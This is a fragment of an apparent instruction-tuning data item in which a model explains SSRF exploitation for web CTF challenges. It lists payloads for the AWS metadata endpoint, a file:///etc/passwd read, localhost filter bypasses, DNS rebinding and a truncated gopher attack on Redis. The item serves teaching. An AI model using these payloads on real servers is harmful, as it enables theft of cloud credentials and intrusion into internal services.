    "        \"instruction\": \"Explain SSRF and how to exploit it in web CTF challenges.\",\n",
    "        \"output\": \"Server-Side Request Forgery (SSRF) tricks the server into making HTTP requests to internal resources.\\n\\nIdentification: Parameters like url=, endpoint=, webhook=, redirect= that accept URLs.\\n\\nBasic exploitation:\\n- Access internal services: http://127.0.0.1:8080/admin\\n- AWS metadata: http://169.254.169.254/latest/meta-data/\\n- File read: file:///etc/passwd\\n\\nBypass filters:\\n- http://0x7f000001 (hex for 127.0.0.1)\\n- http://127.1 (short form)\\n- http://[::1] (IPv6 localhost)\\n- http://attacker.com → 127.0.0.1 (DNS rebinding)\\n\\nFor Gopher protocol SSRF (attacks Redis/MySQL):\\ngopher://127.0.0.1:6379/_%2A1%0D%0A...\"\n",
